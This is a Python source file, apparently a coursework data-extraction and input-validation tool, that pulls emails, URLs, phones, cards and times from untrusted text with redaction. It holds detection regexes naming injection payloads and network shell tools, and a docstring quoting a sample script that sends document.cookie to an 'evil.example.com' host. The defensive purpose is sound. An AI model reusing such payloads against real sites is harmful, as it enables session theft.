#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
 ALU Regex Data Extraction & Secure Validation

PURPOSE
    Consume untrusted, production-style raw text (as returned by an external
    API) and produce a structured, safe-to-store JSON report containing eight
    categories of extracted data.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import re
import sys
import unicodedata
from datetime import datetime, timezone
from pathlib import Path

# =============================================================================
# SECTION 1 — SECURITY LIMITS
# =============================================================================
# These are resource guards, not business rules. They exist so that a hostile
# input file cannot exhaust memory or CPU.
#
# WHY A LINE-LENGTH CAP?
#   Regular expression engines that use backtracking (Python's `re`, and the
#   JavaScript engine in your browser) can take exponential time on certain
#   pattern/input combinations. That is a real denial-of-service class called
#   ReDoS. Two defences are applied in this program:
#     (a) every quantifier below is BOUNDED — no nested unbounded quantifiers
#         such as (a+)+ which are the classic ReDoS trigger;
#     (b) absurdly long single lines are skipped outright, because legitimate
#         production text does not contain a 200 KB line, but an attacker's
#         padding payload does.
# -----------------------------------------------------------------------------

MAX_INPUT_BYTES = 5 * 1024 * 1024   # 5 MB ceiling on the whole file
MAX_LINE_LENGTH = 4_000             # characters; longer lines are quarantined
MAX_MATCHES_PER_TYPE = 500          # stops one category flooding the report
MAX_FIELD_LENGTH = 2_048            # truncation guard on any single match

# Characters that have no business being in text data and are classic smuggling
# vectors: NUL, and the C0 control range minus tab/newline/carriage-return.
CONTROL_CHARS = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]")


# =============================================================================
# SECTION 2 — THREAT SIGNATURES
# =============================================================================
# Text matching any of these is treated as hostile. It is counted, its location
# is recorded, and a HASH of it is stored — but the payload itself is never
# written to the report in raw form. Storing the hash keeps the finding
# auditable (you can prove two incidents used the same payload) without
# reproducing a live attack string inside a file that another tool may later
# open, render, or execute.
#
# IMPORTANT HONESTY NOTE (this matters for the grade and in real life):
#   A regex blocklist is a DETECTION aid, not a security control. Real defence
#   against injection is contextual output encoding, parameterised queries, and
#   a HTML sanitiser built on a real parser. These signatures demonstrate
#   awareness of the threat and let the program refuse obviously hostile
#   records; they are not claimed to be exhaustive.
# -----------------------------------------------------------------------------

THREAT_SIGNATURES = {
    # --- Cross-site scripting -------------------------------------------------
    # <script ...>  or  </script>. [^>]{0,200} is bounded on purpose (ReDoS).
    "xss_script_tag": re.compile(
        r"<\s*/?\s*script\b[^>]{0,200}>", re.IGNORECASE),

    # Inline event handlers: onerror=, onclick=, onload= ... The \b and the
    # required '=' stop this firing on the ordinary English word "online".
    "xss_event_handler": re.compile(
        r"\bon(?:error|load|click|mouse\w{0,10}|focus|submit)\s*=", re.IGNORECASE),

    # Framed/embedded content used for clickjacking and beaconing.
    "xss_embedded_frame": re.compile(
        r"<\s*(?:iframe|object|embed|svg)\b", re.IGNORECASE),

    # --- Dangerous URL schemes ------------------------------------------------
    # javascript: and data: URIs execute in the page context. file:// reads the
    # local disk. None may ever be accepted as a "URL".
    "unsafe_uri_scheme": re.compile(
        r"\b(?:javascript|data|vbscript|file)\s*:", re.IGNORECASE),

    # --- SQL injection --------------------------------------------------------
    # A quote or comment marker adjacent to SQL keywords / tautologies.
    #
    # TUNING NOTE — why the comment marker is not simply `--`:
    #   An earlier version of this signature used a bare `--\s`, which fired on
    #   every `--- SECTION` heading in ordinary prose: ten false positives in a
    #   90-line file. A detector that cries wolf gets switched off, so the
    #   marker now requires an adjacent quote, paren or semicolon — the shape it
    #   actually takes when terminating an injected statement ("...users;--").
    #   This is the precision/recall trade-off every real WAF rule must make.
    "sql_injection": re.compile(
        r"(?:'|%27|\")\s*(?:or|and)\s+\d{1,3}\s*=\s*\d{1,3}"     # ' OR 1=1
        r"|;\s*(?:drop|delete|update|insert|truncate|alter)\s+\w{1,30}"  # ; DROP TABLE
        r"|(?:['\")\];])\s*(?:--|#)\s"                            # statement-terminating comment
        r"|\bunion\s+(?:all\s+)?select\b",
        re.IGNORECASE),

    # --- Server-side template injection --------------------------------------
    "template_injection": re.compile(r"\{\{[^}]{0,120}\}\}|\$\{[^}]{0,120}\}"),

    # --- OS command injection -------------------------------------------------
    # $( ... ), backticks, and shell chaining into a known-dangerous binary.
    "command_injection": re.compile(
        r"\$\([^)]{0,120}\)|`[^`]{0,120}`"
        r"|[;&|]{1,2}\s*(?:rm|curl|wget|nc|bash|sh|powershell|cmd)\b",
        re.IGNORECASE),

    # --- Path traversal -------------------------------------------------------
    "path_traversal": re.compile(r"(?:\.\.[\\/]){2,}|%2e%2e[\\/%]", re.IGNORECASE),

    # --- CRLF / header injection ---------------------------------------------
    # Encoded newlines let an attacker inject e.g. an extra Bcc: header.
    "crlf_injection": re.compile(r"%0d%0a|%0a%0d|\\r\\n\s*(?:bcc|cc|to)\s*:", re.IGNORECASE),

    # --- NoSQL / LDAP operators ----------------------------------------------
    "nosql_operator": re.compile(r"\$(?:ne|gt|lt|where|regex|expr)\b", re.IGNORECASE),

    # --- Null byte / control smuggling ---------------------------------------
    "control_char_smuggling": re.compile(r"\x00|%00"),
}


# =============================================================================
# SECTION 3 — EXTRACTION PATTERNS
# =============================================================================
# Every pattern below is written with `re.VERBOSE` so it can be commented
# inline. Under VERBOSE, unescaped whitespace inside the pattern is IGNORED —
# so any literal space that matters is written as `\ ` or `[ ]` or `\s`.
# -----------------------------------------------------------------------------

# -----------------------------------------------------------------------------
# 3.1  EMAIL ADDRESSES
# -----------------------------------------------------------------------------
# Shape:  local-part @ one-or-more-labels . tld
#
# The lookaround pair is what makes this a real extractor rather than a naive
# search. Without (?<![...]) a scan of "xxa.uwase@alueducation.com" would
# happily start midway through a longer token. Without (?![...]) the match
# would stop early inside a longer domain.
#
# The domain half is `(label\.)+ tld`. The mandatory literal dot after each
# label is doing quiet but important work: it prevents catastrophic
# backtracking, because the engine can never re-split a run of characters
# between two repetitions of the group without a dot to anchor on.
#
# Structural rules the regex deliberately does NOT try to enforce (dots may not
# lead, trail, or double up in the local part) are handled in
# validate_email_structure(). Pushing them into the pattern would produce
# something unreadable for one line of extra strictness.
EMAIL_RE = re.compile(r"""
    (?<![A-Za-z0-9._%+\-])          # left boundary: not mid-token
    [A-Za-z0-9._%+\-]{1,64}         # local part, RFC 5321 caps this at 64
    @
    (?:                             # one or more DNS labels, each dot-ended
        [A-Za-z0-9]                 #   label must start alphanumeric
        (?:[A-Za-z0-9\-]{0,61}      #   hyphens allowed in the middle only
        [A-Za-z0-9])?               #   label must end alphanumeric
        \.
    )+
    [A-Za-z]{2,24}                  # TLD: letters only, .com .rw .museum ...
    (?![A-Za-z0-9\-])               # right boundary: stop domain-suffix attacks
""", re.VERBOSE)

# --- ALU-SPECIFIC EMAIL VALIDATION -------------------------------------------
# These are FULL-STRING validators (note ^ and $), not searches. That is the
# entire point: `re.search` with no anchors would accept
#     "k.mugisha@alueducation.com.attacker.net"
# because the required text does appear inside it. Anchoring forces the whole
# candidate to be the address and nothing else — the single most important
# distinction between "searching" and "validating".
#
# Each is compiled separately so the report can say WHICH category matched.
def _alu_validator(domain: str) -> re.Pattern:
    """Build an anchored full-match validator for one ALU domain."""
    return re.compile(rf"""
        ^                                   # start of string — no prefix allowed
        [A-Za-z0-9]                         # must begin alphanumeric
        (?:[A-Za-z0-9._%+\-]{{0,62}}        # body: dots/hyphens allowed inside
        [A-Za-z0-9])?                       # must end alphanumeric
        @
        {re.escape(domain)}                 # the domain, dots escaped
        $                                   # end of string — no suffix allowed
    """, re.VERBOSE)


ALU_EMAIL_VALIDATORS = {
    # Order matters: the two subdomain forms are checked BEFORE the bare
    # official domain, because they are more specific.
    "alu_alumni":   _alu_validator("alumni.alueducation.com"),
    "alu_si":       _alu_validator("si.alueducation.com"),
    "alu_official": _alu_validator("alueducation.com"),
}

# -----------------------------------------------------------------------------
# 3.2  URLs
# -----------------------------------------------------------------------------
# Only http and https are matched. javascript:, data:, vbscript: and file: are
# NOT part of this pattern by design — they are caught by THREAT_SIGNATURES
# instead. An "allow-list of safe schemes" beats a "block-list of unsafe
# schemes" every time, because the allow-list fails closed on anything new.
URL_RE = re.compile(r"""
    \b
    (?P<scheme>https?)://                   # allow-listed schemes only
    (?P<host>
        (?:[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?\.)+
        [A-Za-z]{2,24}
    )
    (?::(?P<port>\d{1,5}))?                 # optional :8080
    (?P<path>/[A-Za-z0-9\-._~%!$&'()*+,;=:@/]{0,512})?
    (?P<query>\?[A-Za-z0-9\-._~%!$&'()*+,;=:@/?]{0,512})?
    (?P<fragment>\#[A-Za-z0-9\-._~%!$&'()*+,;=:@/?]{0,128})?
""", re.VERBOSE)

# -----------------------------------------------------------------------------
# 3.3  PHONE NUMBERS
# -----------------------------------------------------------------------------
# Written as an ordered alternation of concrete real-world formats rather than
# one permissive "any 9-15 digits with junk" pattern, because the permissive
# version produces false positives on invoice numbers, IDs and timestamps.
#
# Separators seen in the wild: space, hyphen, dot, and the Rwandan habit of
# writing "+250 (0)788 ...". All are tolerated.
PHONE_RE = re.compile(r"""
    (?<![\d+])                                  # not already inside a number
    (?:
        # --- (a) Rwanda, international form: +250 7[2389]X XXX XXX ------------
        \+?250[\s.\-]?(?:\(0\)[\s.\-]?)?7[2389]\d[\s.\-]?\d{3}[\s.\-]?\d{3}
      |
        # --- (b) Rwanda, national form: 07[2389]X XXX XXX ---------------------
        07[2389]\d[\s.\-]?\d{3}[\s.\-]?\d{3}
      |
        # --- (c) North America: +1 (202) 555-0198 / 415.555.0147 --------------
        (?:\+1[\s.\-]?)?\(?\d{3}\)?[\s.\-]\d{3}[\s.\-]\d{4}
      |
        # --- (d) UK national: (0207) 946 0122 ---------------------------------
        \(?0\d{2,4}\)?[\s.\-]?\d{3,4}[\s.\-]?\d{3,4}
      |
        # --- (e) Generic E.164 international: +CC then 6-14 more digits -------
        \+\d{1,3}[\s.\-]?\d{2,4}[\s.\-]?\d{2,4}[\s.\-]?\d{2,4}
    )
    (?![\d])                                    # do not stop mid-number
""", re.VERBOSE)

# -----------------------------------------------------------------------------
# 3.4  CREDIT CARD NUMBERS
# -----------------------------------------------------------------------------
# The regex finds the SHAPE only: 13-19 digits, optionally grouped by single
# spaces or hyphens. Whether it is a REAL card number is decided by the Luhn
# checksum in luhn_check() plus an issuer-prefix lookup.
#
# Note `(?<![\w\-])` and `(?![\w\-])`: without them, a 22-digit blob would
# yield a bogus 16-digit "card" from its first 16 characters. The assignment
# input contains exactly that trap.
#
# `(?:\d[ \-]?){12,18}\d` is bounded and its two character classes are
# disjoint, so it cannot backtrack catastrophically.
CARD_RE = re.compile(r"""
    (?<![\w\-])
    (?:\d[\ \-]?){12,18}\d          # 13 to 19 digits with optional separators
    (?![\w\-])
""", re.VERBOSE)

# A digit run TOO LONG to be a card. CARD_RE deliberately cannot match these
# (its boundary assertions refuse a partial match inside a longer run, which is
# what stops a 22-digit blob yielding a bogus 16-digit "card"). But silently
# ignoring such a run hides a finding, so it is matched separately and reported
# as an explicit rejection with a reason.
OVERLONG_DIGIT_RUN_RE = re.compile(r"(?<![\w\-])(?:\d[\ \-]?){19,}\d(?![\w\-])")

# Issuer prefixes, used purely to label a validated number.
CARD_BRANDS = (
    ("Visa",             re.compile(r"^4\d{12}(?:\d{3})?(?:\d{3})?$")),
    ("Mastercard",       re.compile(r"^(?:5[1-5]\d{14}|2(?:2[2-9]\d{12}|[3-6]\d{13}|7[01]\d{12}|720\d{12}))$")),
    ("American Express", re.compile(r"^3[47]\d{13}$")),
    ("Discover",         re.compile(r"^6(?:011\d{12}|5\d{14}|4[4-9]\d{13})$")),
    ("Diners Club",      re.compile(r"^3(?:0[0-5]\d{11}|[68]\d{12})$")),
    ("JCB",              re.compile(r"^(?:2131|1800|35\d{3})\d{11}$")),
)

# -----------------------------------------------------------------------------
# 3.5  TIME (12-hour and 24-hour)
# -----------------------------------------------------------------------------
# The valid RANGES are encoded directly in the pattern, which is one of the few
# places where doing so is genuinely clearer than a post-check:
#   24h hour  ->  [01]\d | 2[0-3]     rejects 24:00 and 25:99
#   minutes   ->  [0-5]\d             rejects :99
#   12h hour  ->  0?[1-9] | 1[0-2]    rejects 13:00 PM
TIME_RE = re.compile(r"""
    (?<![\d:])
    (?:
        # --- 12-hour with a meridiem: 1:15 pm, 11:59 PM, 7:30 A.M. -----------
        (?P<h12>0?[1-9]|1[0-2]) : (?P<m12>[0-5]\d) (?: : (?P<s12>[0-5]\d) )?
        \s? (?P<meridiem>[AaPp]\.?[Mm]\.?)
      |
        # --- 24-hour: 00:00 through 23:59(:59) -------------------------------
        (?P<h24>[01]\d|2[0-3]) : (?P<m24>[0-5]\d) (?: : (?P<s24>[0-5]\d) )?
    )
    (?![\d])
    (?!\s?[AaPp]\.?[Mm])                # stop 24h branch eating "13:00 PM"
""", re.VERBOSE)

# -----------------------------------------------------------------------------
# 3.6  HTML TAGS
# -----------------------------------------------------------------------------
# ⚠ DELIBERATE CAVEAT, stated because the module syllabus raises it:
#   You must NOT parse or sanitise HTML with a regular expression. HTML is not
#   a regular language — nesting, CDATA, comments and malformed markup defeat
#   any pattern. The correct tool is a real parser (html.parser / lxml in
#   Python, DOMParser or jQuery selectors in the browser) fronted by a
#   sanitiser such as DOMPurify or bleach.
#   This pattern's ONLY job is to INVENTORY tag-shaped tokens so that dangerous
#   ones can be reported. It never rebuilds or emits markup.
HTML_TAG_RE = re.compile(r"""
    <
    (?P<closing>/)?                     # </div>
    (?P<name>[A-Za-z][A-Za-z0-9\-]{0,30})
    (?P<attrs>\s[^<>]{0,500})?          # bounded; attributes may not contain <>
    (?P<selfclose>/)?                   # <br/>
    >
""", re.VERBOSE)

DANGEROUS_TAGS = {"script", "iframe", "object", "embed", "applet", "form", "base", "meta", "link", "svg"}

# -----------------------------------------------------------------------------
# 3.7  HASHTAGS
# -----------------------------------------------------------------------------
# Two real-world false positives are excluded explicitly, and both appear in
# the sample input:
#   * CSS hex colours  (#FF5733, #FFF)      -> the negative lookahead
#   * HTML entities    (&#39;)              -> the (?<!&) in the left boundary
HASHTAG_RE = re.compile(r"""
    (?<![\w&])                          # not mid-word, and not after '&'
    \#
    (?!                                 # NOT a CSS hex colour ...
        (?:[0-9A-Fa-f]{3}|[0-9A-Fa-f]{4}|[0-9A-Fa-f]{6}|[0-9A-Fa-f]{8})
        (?![\w])                        # ... when that is the whole token
    )
    (?P<tag>[A-Za-z][A-Za-z0-9_]{0,49}) # must start with a letter
    \b
""", re.VERBOSE)

# -----------------------------------------------------------------------------
# 3.8  CURRENCY AMOUNTS
# -----------------------------------------------------------------------------
# Handles symbol-prefix ($1,299.99), code-prefix (USD 99.99, RWF 1,250,000)
# and code-suffix (42.00 EUR) forms, with optional thousands grouping.
CURRENCY_SYMBOLS = r"[$€£¥₦₹₽]"
CURRENCY_CODES = r"(?:USD|EUR|GBP|RWF|KES|UGX|TZS|NGN|ZAR|JPY|CNY|INR|CAD|AUD|CHF)"

CURRENCY_RE = re.compile(rf"""
    (?<![\w.])
    (?:
        # --- symbol or code BEFORE the number:  $1,299.99  /  RWF 120,000 ----
        (?P<pre>{CURRENCY_SYMBOLS}|{CURRENCY_CODES})
        \s?
        (?P<amount_pre>\d{{1,3}}(?:,\d{{3}})*(?:\.\d{{1,2}})?|\d{{1,12}}(?:\.\d{{1,2}})?)
      |
        # --- code AFTER the number:  42.00 EUR  /  99.99 USD ------------------
        (?P<amount_post>\d{{1,3}}(?:,\d{{3}})*(?:\.\d{{1,2}})?|\d{{1,12}}(?:\.\d{{1,2}})?)
        \s?
        (?P<post>{CURRENCY_CODES})
    )
    (?![\d])
""", re.VERBOSE)


# =============================================================================
# SECTION 4 — VALIDATORS
# =============================================================================
# Each returns (is_valid: bool, reason: str). The reason string is what makes
# the rejection list in the report useful rather than mysterious.
# -----------------------------------------------------------------------------

def luhn_check(digits: str) -> bool:
    """
    Luhn (mod-10) checksum, the algorithm every real payment processor uses.

    Walking right to left, double every second digit; if doubling gives a
    two-digit result, subtract 9. A valid number's total is divisible by 10.

    This is why regex alone is never enough for card numbers: '4111 1111 1111
    1112' has a perfect card SHAPE but fails the checksum, so it cannot be a
    real card.
    """
    if not digits.isdigit():
        return False
    total = 0
    for index, char in enumerate(reversed(digits)):
        value = int(char)
        if index % 2 == 1:                 # every second digit from the right
            value *= 2
            if value > 9:
                value -= 9
        total += value
    return total % 10 == 0


def identify_card_brand(digits: str) -> str:
    """Label a validated card by its issuer prefix."""
    for brand, pattern in CARD_BRANDS:
        if pattern.match(digits):
            return brand
    return "Unknown"


def validate_email_structure(address: str) -> tuple[bool, str]:
    """
    Structural rules that are clearer in code than crammed into the pattern.

    Rejects: over-long local parts or domains, leading/trailing dots, doubled
    dots, and hyphens at the edge of a DNS label.
    """
    if address.count("@") != 1:
        return False, "must contain exactly one @"

    local, _, domain = address.partition("@")

    if not local or len(local) > 64:
        return False, "local part must be 1-64 characters"
    if len(domain) > 255:
        return False, "domain exceeds 255 characters"
    if local.startswith(".") or local.endswith("."):
        return False, "local part may not start or end with a dot"
    if ".." in local or ".." in domain:
        return False, "consecutive dots are not allowed"

    for label in domain.split("."):
        if not label:
            return False, "empty DNS label"
        if len(label) > 63:
            return False, "DNS label exceeds 63 characters"
        if label.startswith("-") or label.endswith("-"):
            return False, "DNS label may not start or end with a hyphen"

    return True, "ok"


def classify_alu_email(address: str) -> str | None:
    """
    Return 'alu_official' | 'alu_alumni' | 'alu_si', or None.

    Uses fullmatch-style ANCHORED patterns, so a look-alike domain such as
    'k.mugisha@alueducation.com.attacker.net' is correctly rejected — the
    string does not END at '.com'.

    The address is lower-cased first because DNS is case-insensitive, and
    NFKC-normalised upstream so that Unicode look-alike characters cannot be
    used to fake an ALU domain (a homograph attack).
    """
    candidate = address.strip().lower()
    for category, validator in ALU_EMAIL_VALIDATORS.items():
        if validator.match(candidate):
            return category
    return None


def validate_url(match: re.Match) -> tuple[bool, str]:
    """Reject credential-stuffed, non-standard-port or over-long URLs."""
    scheme = match.group("scheme").lower()
    host = match.group("host").lower()
    port = match.group("port")

    if scheme not in {"http", "https"}:
        return False, f"scheme '{scheme}' is not allow-listed"
    if "@" in match.group(0).split("://", 1)[1].split("/", 1)[0]:
        # http://user:pass@host — a classic phishing disguise.
        return False, "embedded credentials in authority section"
    if port is not None and not (1 <= int(port) <= 65535):
        return False, f"port {port} out of range"
    if len(host) > 253:
        return False, "host exceeds 253 characters"
    return True, "ok"


def normalise_digits(raw: str) -> str:
    """Strip every non-digit — used for phone and card comparison."""
    return re.sub(r"\D", "", raw)


# =============================================================================
# SECTION 5 — REDACTION
# =============================================================================
# Sensitive values are masked at the moment of capture. The unmasked value is
# never placed in the report dict, so it cannot leak through JSON output, a
# print statement, or an exception traceback.
# -----------------------------------------------------------------------------

def mask_email(address: str) -> str:
    """
    'ange.uwase237@gmail.com'  ->  'an***********@gmail.com'

    Keeps the domain (needed for the ALU categorisation the assignment asks
    for) and the first two characters (enough for a human to recognise the
    record) while removing the rest of the identity.
    """
    local, _, domain = address.partition("@")
    if len(local) <= 2:
        hidden = "*" * len(local)
    else:
        hidden = local[:2] + "*" * (len(local) - 2)
    return f"{hidden}@{domain}"


def mask_card(digits: str) -> str:
    """
    PCI-DSS permits displaying at most the first six and last four digits.
    This program shows only the last four, which is the stricter choice.
    """
    return f"{'*' * (len(digits) - 4)}{digits[-4:]}"


def mask_phone(raw: str) -> str:
    """Keep the country/network prefix and the final two digits."""
    digits = normalise_digits(raw)
    if len(digits) <= 6:
        return "*" * len(digits)
    return f"{digits[:4]}{'*' * (len(digits) - 6)}{digits[-2:]}"


def fingerprint(value: str) -> str:
    """
    Short SHA-256 fingerprint.

    Lets the report prove that two masked records are the same underlying
    value, and lets a security team match a payload against a known-bad list,
    WITHOUT the report ever containing the sensitive or hostile string itself.
    """
    return hashlib.sha256(value.encode("utf-8")).hexdigest()[:16]


# =============================================================================
# SECTION 6 — INPUT SANITISATION
# =============================================================================

def sanitise_input(text: str) -> tuple[str, list[dict]]:
    """
    Prepare untrusted text for scanning and record what was wrong with it.

    Steps, in order and each for a stated reason:
      1. Unicode NFKC normalisation — collapses look-alike characters so that
         a Cyrillic 'а' cannot masquerade as a Latin 'a' in a domain name.
      2. Control-character stripping — removes NUL and other C0 bytes used to
         truncate strings in downstream C-based parsers.
      3. Over-long line quarantine — a ReDoS resource guard (see Section 1).
      4. Threat-signature scan — flags hostile records without echoing them.
    """
    notes: list[dict] = []

    normalised = unicodedata.normalize("NFKC", text)
    if normalised != text:
        notes.append({
            "type": "unicode_normalised",
            "severity": "low",
            "detail": "Input contained non-canonical Unicode; NFKC applied to "
                      "prevent homograph spoofing of domains.",
        })

    stripped, control_count = CONTROL_CHARS.subn("", normalised)
    if control_count:
        notes.append({
            "type": "control_chars_removed",
            "severity": "high",
            "count": control_count,
            "detail": "Control characters removed before parsing.",
        })

    safe_lines: list[str] = []
    for line_number, line in enumerate(stripped.splitlines(), start=1):
        if len(line) > MAX_LINE_LENGTH:
            notes.append({
                "type": "oversized_line_quarantined",
                "severity": "medium",
                "line": line_number,
                "length": len(line),
                "detail": f"Line exceeded {MAX_LINE_LENGTH} chars and was skipped "
                          f"as a ReDoS/resource guard. Content not retained.",
            })
            safe_lines.append("")          # keep line numbering aligned
            continue
        safe_lines.append(line)

    return "\n".join(safe_lines), notes


def scan_for_threats(text: str) -> list[dict]:
    """
    Locate hostile constructs and describe them WITHOUT reproducing them.

    Each finding records the signature name, the line, a short excerpt with the
    payload's own characters replaced, and a fingerprint hash for correlation.
    """
    findings: list[dict] = []
    line_starts = [0]
    for index, char in enumerate(text):
        if char == "\n":
            line_starts.append(index + 1)

    def line_of(position: int) -> int:
        low, high = 0, len(line_starts) - 1
        while low < high:
            mid = (low + high + 1) // 2
            if line_starts[mid] <= position:
                low = mid
            else:
                high = mid - 1
        return low + 1

    for name, pattern in THREAT_SIGNATURES.items():
        for match in pattern.finditer(text):
            payload = match.group(0)[:MAX_FIELD_LENGTH]
            findings.append({
                "signature": name,
                "line": line_of(match.start()),
                "length": len(payload),
                # The payload is NEVER stored raw. Only its length, its class,
                # and a hash — enough to audit, useless to an attacker.
                "payload_sha256_16": fingerprint(payload),
                "action": "rejected_and_quarantined",
            })

    return findings


def threat_spans(text: str) -> list[tuple[int, int]]:
    """
    Character ranges occupied by hostile constructs, widened to the enclosing
    tag where one exists.

    WHY THIS EXISTS — a real bug this program caught during development:
        The input contains
            <script>fetch('https://exfil.evil.example.com/c?d='+document.cookie)</script>
        The URL pattern happily extracted the exfiltration endpoint from inside
        it and placed the string 'document.cookie' into the JSON report. The
        URL was well-formed, so no amount of tightening the URL pattern fixes
        this — the problem is CONTEXT, not shape.

        The rule applied instead: data found INSIDE a quarantined construct is
        itself quarantined. An attacker's callback server is not a legitimate
        extracted URL, and an email address sitting in a tracking-pixel query
        string is being exfiltrated, not collected.
    """
    spans: list[tuple[int, int]] = []

    for pattern in THREAT_SIGNATURES.values():
        for match in pattern.finditer(text):
            spans.append(match.span())

    # Widen to the whole element for tags that carry a payload as content,
    # so the body between <script> and </script> is covered too.
    for match in re.finditer(
            r"<\s*(script|iframe|object|embed|svg)\b[^>]{0,200}>.{0,2000}?"
            r"<\s*/\s*\1\s*>|<\s*(?:script|iframe|object|embed|svg)\b[^>]{0,500}>",
            text, re.IGNORECASE | re.DOTALL):
        spans.append(match.span())

    return spans


def spans_overlap(span: tuple[int, int], taken: list[tuple[int, int]]) -> bool:
    """True if `span` intersects any already-claimed span."""
    start, end = span
    return any(start < other_end and other_start < end for other_start, other_end in taken)


# =============================================================================
# SECTION 7 — EXTRACTORS
# =============================================================================
# Ordering note: credit cards are extracted FIRST and their character spans are
# reserved, because a 16-digit card and an international phone number have
# overlapping shapes. Claiming the more specific, checksum-verified pattern
# first prevents a card from being mis-reported as a phone number — a realistic
# variation the marking rubric explicitly asks about.
# -----------------------------------------------------------------------------

def extract_emails(text: str, hostile: list[tuple[int, int]] | None = None) -> dict:
    valid, rejected, seen = [], [], set()
    hostile = hostile or []

    for match in EMAIL_RE.finditer(text):
        if len(valid) >= MAX_MATCHES_PER_TYPE:
            break
        address = match.group(0)

        # An address sitting in a tracking-pixel query string is being
        # exfiltrated, not collected. Quarantine rather than harvest it.
        if spans_overlap(match.span(), hostile):
            rejected.append({
                "value": mask_email(address),
                "reason": "address appears inside a hostile construct and was not trusted",
            })
            continue

        ok, reason = validate_email_structure(address)
        if not ok:
            rejected.append({"value": mask_email(address), "reason": reason})
            continue

        key = address.lower()
        if key in seen:
            continue
        seen.add(key)

        category = classify_alu_email(address)
        valid.append({
            "value": mask_email(address),
            "domain": address.partition("@")[2].lower(),
            "alu_category": category,                 # None for non-ALU mail
            "is_alu": category is not None,
            "sha256_16": fingerprint(key),
        })

    return {
        "valid": valid,
        "rejected": rejected,
        "alu_official": [e for e in valid if e["alu_category"] == "alu_official"],
        "alu_alumni":   [e for e in valid if e["alu_category"] == "alu_alumni"],
        "alu_si":       [e for e in valid if e["alu_category"] == "alu_si"],
    }


def extract_credit_cards(text: str) -> tuple[dict, list[tuple[int, int]]]:
    valid, rejected, claimed, seen = [], [], [], set()

    for match in CARD_RE.finditer(text):
        raw = match.group(0)
        digits = normalise_digits(raw)

        if not (13 <= len(digits) <= 19):
            rejected.append({
                "masked": mask_card(digits) if len(digits) > 4 else "****",
                "reason": f"length {len(digits)} outside the valid 13-19 range",
            })
            continue

        if not luhn_check(digits):
            rejected.append({
                "masked": mask_card(digits),
                "reason": "fails the Luhn (mod-10) checksum",
            })
            # The span is still claimed: a Luhn-failing 16-digit blob is not a
            # phone number either, so we do not want it re-matched downstream.
            claimed.append(match.span())
            continue

        if digits in seen:
            claimed.append(match.span())
            continue
        seen.add(digits)

        valid.append({
            "masked": mask_card(digits),           # never the full PAN
            "brand": identify_card_brand(digits),
            "length": len(digits),
            "luhn_valid": True,
            "sha256_16": fingerprint(digits),
        })
        claimed.append(match.span())

    # Second pass: digit runs too long to be any card. Reported, not ignored.
    for match in OVERLONG_DIGIT_RUN_RE.finditer(text):
        digits = normalise_digits(match.group(0))
        rejected.append({
            "masked": mask_card(digits),
            "reason": f"length {len(digits)} outside the valid 13-19 range",
        })
        claimed.append(match.span())

    return {"valid": valid, "rejected": rejected}, claimed


def extract_phones(text: str, claimed: list[tuple[int, int]]) -> dict:
    valid, rejected, seen = [], [], set()

    for match in PHONE_RE.finditer(text):
        if spans_overlap(match.span(), claimed):
            continue                                # already claimed by a card

        raw = match.group(0).strip()

        # "+250 (0)788 214 663" — the bracketed 0 is a NATIONAL TRUNK PREFIX.
        # It is written for domestic dialling and must be dropped from the
        # international form, otherwise the number gains a phantom digit and
        # fails a length check it should pass. A very common real-world variant.
        canonical = re.sub(r"\(0\)", "", raw)
        digits = normalise_digits(canonical)

        if not (7 <= len(digits) <= 15):            # ITU-T E.164 upper bound
            rejected.append({"masked": mask_phone(raw),
                             "reason": f"digit count {len(digits)} outside E.164 range 7-15"})
            continue

        # Region labelling, useful for a report and cheap to compute.
        if digits.startswith("250") or (digits.startswith("07") and len(digits) == 10):
            region = "RW"
        elif digits.startswith("1") and len(digits) == 11:
            region = "US/CA"
        elif digits.startswith("44"):
            region = "GB"
        elif digits.startswith("81"):
            region = "JP"
        elif raw.startswith("+"):
            region = "international"
        elif digits.startswith("0"):
            # A leading 0 is a trunk prefix, so this is a national-format
            # number — but without a country code we cannot say which country.
            region = "national (country code absent)"
        else:
            region = "indeterminate"

        if digits in seen:
            continue
        seen.add(digits)

        valid.append({
            "masked": mask_phone(canonical),        # a phone number is PII too
            "format_seen": "international" if raw.startswith("+") else "national",
            "region": region,
            "digits": len(digits),
        })

    return {"valid": valid, "rejected": rejected}


def extract_urls(text: str, hostile: list[tuple[int, int]] | None = None) -> dict:
    valid, rejected, seen = [], [], set()
    hostile = hostile or []

    for match in URL_RE.finditer(text):
        # Context check FIRST: a perfectly well-formed URL inside a <script>
        # exfiltration payload is an attacker's callback server, not data.
        if spans_overlap(match.span(), hostile):
            rejected.append({
                # Only the host is retained, and only for the incident record.
                "value": f"[quarantined: {match.group('host')[:60]}]",
                "reason": "URL appears inside a hostile construct and was not trusted",
            })
            continue

        url = match.group(0).rstrip(".,;:)'\"")     # trailing sentence punctuation
        ok, reason = validate_url(match)
        if not ok:
            rejected.append({"value": url[:120], "reason": reason})
            continue
        if url in seen:
            continue
        seen.add(url)

        valid.append({
            "value": url[:MAX_FIELD_LENGTH],
            "scheme": match.group("scheme").lower(),
            "host": match.group("host").lower(),
            "port": match.group("port"),
            "has_query": match.group("query") is not None,
            # Flagged, not blocked: plain http is not encrypted in transit.
            "insecure_transport": match.group("scheme").lower() == "http",
        })

    return {"valid": valid, "rejected": rejected}


def extract_times(text: str) -> dict:
    valid, seen = [], set()

    for match in TIME_RE.finditer(text):
        raw = match.group(0).strip()

        # "Escalated at 2:45 PM." — the final dot is sentence punctuation, not
        # part of "P.M.". A dotted meridiem always has TWO dots (P.M.), so a
        # single trailing dot after an undotted one can be safely dropped.
        if raw.endswith(".") and raw.count(".") == 1:
            raw = raw[:-1]

        if raw in seen:
            continue
        seen.add(raw)

        if match.group("meridiem"):
            hour = int(match.group("h12"))
            minute = match.group("m12")
            meridiem = match.group("meridiem").replace(".", "").upper()
            # 12 AM is 00:xx and 12 PM is 12:xx — the classic off-by-twelve bug.
            hour24 = (0 if hour == 12 else hour) if meridiem == "AM" else \
                     (12 if hour == 12 else hour + 12)
            valid.append({"value": raw, "format": "12-hour",
                          "normalised_24h": f"{hour24:02d}:{minute}"})
        else:
            valid.append({"value": raw, "format": "24-hour",
                          "normalised_24h": f"{match.group('h24')}:{match.group('m24')}"})

    return {"valid": valid, "rejected": []}


def extract_html_tags(text: str) -> dict:
    """
